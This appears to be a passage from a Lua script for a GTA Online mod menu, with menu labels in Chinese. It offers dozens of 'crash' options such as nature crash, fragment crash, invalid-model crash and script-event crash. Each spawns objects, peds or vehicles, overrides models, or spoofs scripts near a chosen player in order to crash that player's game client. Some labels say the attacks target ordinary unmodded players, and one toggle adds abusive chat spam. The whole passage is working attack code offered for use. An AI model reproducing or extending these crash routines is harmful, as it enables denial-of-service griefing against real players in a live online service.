        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        local Object_pizza5 = CreateObject(0xFBF7D21F, TargetPlayerPos)
        local Object_pizza6 = CreateObject(3613262246, TargetPlayerPos)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        entities.delete_by_handle(Object_pizza5)
        entities.delete_by_handle(Object_pizza6)
    end)

    local nmcrashes = menu.list(PlayerMainMenu, "大自然崩溃", {}, "")

    menu.action(nmcrashes, "大自然崩溃V1", {""}, "", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy")
        local pos = players.get_position(PlayerID)
        local oldPos = players.get_position(players.user())
        BlockSyncs(PlayerID, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "大自然崩溃V2", {""}, "", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy001")
        local pos = players.get_position(PlayerID)
        local oldPos = players.get_position(players.user())
        BlockSyncs(PlayerID, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "大自然崩溃V3", {""}, "", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy002")
        local pos = players.get_position(PlayerID)
        local oldPos = players.get_position(players.user())
        BlockSyncs(PlayerID, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "大自然崩溃V4", {""}, "", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht")
        local pos = players.get_position(PlayerID)
        local oldPos = players.get_position(players.user())
        BlockSyncs(PlayerID, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "大自然崩溃V5", {""}, "", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht_win")
        local pos = players.get_position(PlayerID)
        local oldPos = players.get_position(players.user())
        BlockSyncs(PlayerID, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)

    menu.action(nmcrashes, "大自然崩溃V6", {"nature"}, "", function()
        naturecrashv1(PlayerID)
    end)
    
    menu.toggle_loop(nmcrashes, "大自然崩溃V7", {"hiroshima"}, "", function()
        naturecrashv2(PlayerID)
    end)

	menu.action(PlayerMainMenu, "水管崩溃", {}, "", function ()
	        util.request_model(200846641)
	        local objects = {}
	        for i = 1, 40 do
	            local coords = players.get_position(PlayerID)
	            objects[#objects + 1] = entities.create_object(200846641, v3.new(coords.x , coords.y , coords.z))
	            util.yield()
	        end
	        util.yield(3000)
	        for i = 1, 4 do
	            local coords = players.get_position(PlayerID)
	            FIRE.ADD_EXPLOSION(coords.x , coords.y , coords.z, 64, 100, true, true, 0.5, true)
	            util.yield(400)
	        end
	        util.yield(500)
	        for i = 1, #objects do
	            entities.delete_by_handle(objects[i])
	        end
	        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(200846641)
	end)

    local pclpid = {}
    function get_control_request(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("Sin control de "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end
    menu.action(PlayerMainMenu, "全家死绝崩溃", {""}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        for i = 1, 23 do
            local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
            pclpid [#pclpid + 1] = pclone 
            PED.CLONE_PED_TO_TARGET(p, pclone)
        end
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(PlayerMainMenu, "GT崩溃", {}, "cv的垃圾崩溃", function()
        gtcrash(PlayerID)
    end)

    local yycrashs = menu.list(PlayerMainMenu, "仿制的优雅", {}, "")
    menu.action(yycrashs, "仿制的优雅崩溃V1", {"yycrashV0"}, "针对xp用户", function()

        menu.trigger_commands("crash " .. players.get_name(PlayerID))

        menu.trigger_commands("smash " .. players.get_name(PlayerID))

    end)

    menu.action(yycrashs,  "仿制的优雅崩溃V2", {"yycrashV1"}, "针对xp用户", function()
        local cord = players.get_position(PlayerID)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("完成.")
    end)

        menu.toggle(yycrashs, "仿制的优雅崩溃V3", {"yycrashV2"}, "针对xp用户", function(on_toggle)
            notification("正在崩溃V4 " .. PLAYER.GET_PLAYER_NAME(PlayerID))
        if on_toggle then
                menu.trigger_commands("yycrashV0" .. players.get_name(PlayerID))
                menu.trigger_commands("yycrashV1" .. players.get_name(PlayerID))
        else
                menu.trigger_commands("yycrashV0" .. players.get_name(PlayerID))
                menu.trigger_commands("yycrashV1" .. players.get_name(PlayerID))
                menu.trigger_commands("superc")
            end
        
        end)

    menu.action(PlayerMainMenu, "命运崩溃", {"mycrash"}, "", function()

        local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))

        local PED1  = CreatePed(28,-1011537562,TargetPPos,0)

        local PED2  = CreatePed(28,-541762431,TargetPPos,0)

        WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)

        WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)

        util.yield(1000)

        TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)

        TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)

        notification("崩溃完毕.")

    end)

    menu.action(PlayerMainMenu, "死神崩溃", {"sscrash"}, "", function()
        local cord = players.get_position(PlayerID)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        local c1 = entities.create_object(1888301071, cord)
        local c2 = entities.create_object(-1011537562, cord)
        local c3 = entities.create_object(-541762431, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            util.request_model(1888301071)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            entities.delete_by_handle(c1)
            entities.delete_by_handle(c2)
            entities.delete_by_handle(c3)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(1888301071)
            util.yield(10)
        end
        util.toast("崩溃完成.")
    end)

    local frag = menu.list(PlayerMainMenu, "碎片崩溃", {}, "")
    menu.toggle_loop(frag, "碎片崩溃V1", {"togglefragv1"}, "Skidded From 2take1", function(on_toggle)
        v1_frag(PlayerID)
        end)
        
        menu.toggle_loop(frag, "碎片崩溃V2", {"togglefragv2"}, "", function(on_toggle)
            v2_frag(PlayerID)
        end)
        
        menu.toggle(frag, "碎片崩溃V3", {"togglefragv3"}, "", function(on_toggle)
            notification("正在发送碎片崩溃V3给 " .. PLAYER.GET_PLAYER_NAME(PlayerID))
        if on_toggle then
                menu.trigger_commands("togglefragv1" .. players.get_name(PlayerID))
                menu.trigger_commands("togglefragv2" .. players.get_name(PlayerID))
        else
                menu.trigger_commands("togglefragv1" .. players.get_name(PlayerID))
                menu.trigger_commands("togglefragv2" .. players.get_name(PlayerID))
                menu.trigger_commands("superc")
            end
        
        end)

    menu.action(PlayerMainMenu, "脚本事件", {"crashv27"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = players.get_position(PlayerID)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(100)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)

    toxicchatincrash = false
    menu.toggle(PlayerMainMenu, "公屏狗叫", {}, "上面10个崩溃是否开启狗叫(请不要经常用,以避免被ban)", function(on)
        toxicchatincrash = on
    end)

    local mix_crash = menu.list(PlayerMainMenu, "混合崩溃")

    nicecrash_v1 = false
    menu.toggle(mix_crash, "奥特曼崩v1", {}, "", function(on)
        nicecrash_v1 = on
    end)

    nicecrash_v2 = false
    menu.toggle(mix_crash, "奥特曼崩v2", {}, "", function(on)
        nicecrash_v2 = on
    end)

    nicecrash_v3 = false
    menu.toggle(mix_crash, "奥特曼崩v3", {}, "", function(on)
        nicecrash_v3 = on
    end)

    inshell_v1 = false
    menu.toggle(mix_crash, "因莎拉崩溃", {}, "", function(on)
        inshell_v1 = on
    end)

    proluna_v1 = false
    menu.toggle(mix_crash, "露娜崩溃", {}, "", function(on)
        proluna_v1 = on
    end)

    grief_v1 = false
    menu.toggle(mix_crash, "悲伤的耶稣崩溃", {}, "", function(on)
        grief_v1 = on
    end)

    nature_v1 = false
    menu.toggle(mix_crash, "大自然崩溃v1", {}, "", function(on)
        nature_v1 = on
    end)

    nature_v2 = false
    menu.toggle(mix_crash, "大自然崩溃v2", {}, "", function(on)
        nature_v2 = on
    end)

    sweetcrash_v1 = false
    menu.toggle(mix_crash, "泡泡糖崩溃", {}, "", function(on)
        sweetcrash_v1 = on
    end)

    cps_v1 = false
    menu.toggle(mix_crash, "绿玩保护崩溃", {}, "", function(on)
        cps_v1 = on
    end)


    lestercrestcrash_v1 = false
    menu.toggle(mix_crash, "莱纳斯崩溃", {}, "", function(on)
        lestercrestcrash_v1 = on
    end)

    planecrash_v1 = false
    menu.toggle(mix_crash, "美杜莎崩溃", {}, "", function(on)
        planecrash_v1 = on
    end)

    wenyi_v1 = false
    menu.toggle(mix_crash, "马桶崩溃", {}, "", function(on)
        wenyi_v1 = on
    end)

    wade_v1 = false
    menu.toggle(mix_crash, "韦德崩崩溃", {}, "", function(on)
        wade_v1 = on
    end)

    OXCrash_v1 = false
    menu.toggle(mix_crash, "OX崩", {}, "", function(on)
        OXCrash_v1 = on
    end)

    soundcrash_v1 = false
    menu.toggle(mix_crash, "声音崩v1", {}, "", function(on)
        soundcrash_v1 = on
    end)

    soundcrash_v2 = false
    menu.toggle(mix_crash, "声音崩v2", {}, "", function(on)
        soundcrash_v2 = on
    end)

    invalidmodelcrash_v1 = false
    menu.toggle(mix_crash, "无效模型崩溃", {}, "", function(on)
        invalidmodelcrash_v1 = on
    end)

    xxx5gcrash_v1 = false
    menu.toggle(mix_crash, "5g崩溃", {}, "", function(on)
        xxx5gcrash_v1 = on
    end)

    dick_v1 = false
    menu.toggle(mix_crash, "大JB崩", {}, "", function(on)
        dick_v1 = on
    end)

    ChernobogCrash_v1 = false
    menu.toggle(mix_crash, "导弹车崩溃v1", {}, "", function(on)
        ChernobogCrash_v1 = on
    end)

    ChernobogCrash_v2 = false
    menu.toggle(mix_crash, "导弹车崩溃v2", {}, "", function(on)
        ChernobogCrash_v2 = on
    end)

    huntercrash_v1 = false
    menu.toggle(mix_crash, "猎杀者", {}, "", function(on)
        huntercrash_v1 = on
    end)

    scriptevent_v1 = false
    menu.toggle(mix_crash, "脚本事件崩溃", {}, "", function(on)
        scriptevent_v1 = on
    end)

    invalidclothes_v1 = false
    menu.toggle(mix_crash, "无效外观V1", {}, "", function(on)
        invalidclothes_v1 = on
    end)

    invalidclothes_v2 = false
    menu.toggle(mix_crash, "无效外观V2", {}, "", function(on)
        invalidclothes_v2 = on
    end)

    dh_v1 = false
    menu.toggle(mix_crash, "单崩黄昏", {}, "", function(on)
        dh_v1 = on
    end)

    tuoche_v1 = false
    menu.toggle(mix_crash, "拖车崩", {}, "", function(on)
        tuoche_v1 = on
    end)

    menu.action(mix_crash, "混合崩溃", {}, "", function()
        mixx_crash(PlayerID)
    end)

    menu.toggle_loop(PlayerMainMenu, "AIO崩溃", {""}, "", function()
        aaio(PlayerID)
    end)

    menu.click_slider(PlayerMainMenu,"奥特曼崩(不要靠近和观看）", {"nicecrash"}, "1 = V1, 2 = V2, 3 = V3", 1, 3, 1, 1, function(on_change)
        
        if on_change == 1 then		
            aotemanv1(PlayerID)
        end
        if on_change == 2 then
            aotemanv2(PlayerID)
        end
        if on_change == 3 then
            aotemanv3(PlayerID)
        end   
    end)

    menu.action(PlayerMainMenu, "因莎拉崩溃", {"inshell"}, "", function()
        inshellcrash(PlayerID)
    end)
        
    menu.action(PlayerMainMenu, "改进露娜崩溃", {"proluna"}, "", function(state)   
        lunacrash(PlayerID)
    end)
    
    menu.toggle_loop(PlayerMainMenu, "悲伤的耶稣崩溃", {"grief"}, "可以崩溃大多数菜单.", function()
        greifcrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "泡泡糖崩溃", {"sweetcrash"}, "", function()
        sugercrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "绿玩保护崩溃", {"cps"}, "尽量不要靠得太近!", function()
        cpscrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "莱纳斯崩溃", {"lestercrestcrash"}, "", function()
        lestcrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "董哥崩溃", {"dongge"}, "", function()
    dongge(PlayerID)
    end)

    menu.action(PlayerMainMenu, "美杜莎崩溃", {"planecrash"}, "", function() 
    MDS(PlayerID)
    end)
    
    menu.action(PlayerMainMenu,"马桶崩溃", {"wenyi"}, "", function()
    toiletcrash(PlayerID)
	end)

    menu.action(PlayerMainMenu, "韦德崩", {"wade"}, "", function() 
    wadecrash(PlayerID)
    end)
    
    menu.action(PlayerMainMenu, "OX崩v1", {"OXCrash"}, "远离!!!远离!!!远离!!!远离!!!远离!!!远离!!!", function()
        OXcrashgg(PlayerID)
    end)

    menu.toggle_loop(PlayerMainMenu, "OX崩v2", {"OXCrashv2"}, "远离!!!远离!!!远离!!!远离!!!远离!!!远离!!!", function()
        OXcrashggv2(PlayerID)
    end)
  
        menu.click_slider(PlayerMainMenu,"声音崩（不要连点）", {"sound crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)
            if on_change == 1 then	
                soundcrashv1(PlayerID)
            end   
            if on_change == 2 then
                soundcrashv2(PlayerID)
            end
        end)
    local invalidmodel = menu.list(PlayerMainMenu, "无效模型崩溃", {}, "")
        menu.toggle(invalidmodel, "无效模型崩溃V1", {"invalidmodelcrash"}, "", function()
            wxcrash(PlayerID)
        end)

    menu.toggle_loop(invalidmodel, "无效模型崩溃v2", {"badoutfit"}, "", function ()
        BadOutfitCrash(PlayerID)
    end)

	menu.action(invalidmodel, "无效模型崩溃v3", {}, "崩崩绿玩还行", function()
	    util.toast("操你妈，绿玩都不放过")
		local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
		for i = 0 , 30 do 
			invalidpeda1 = CreatePed(26, util.joaat("player_two"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(1)
		for i = 0 , 30 do 
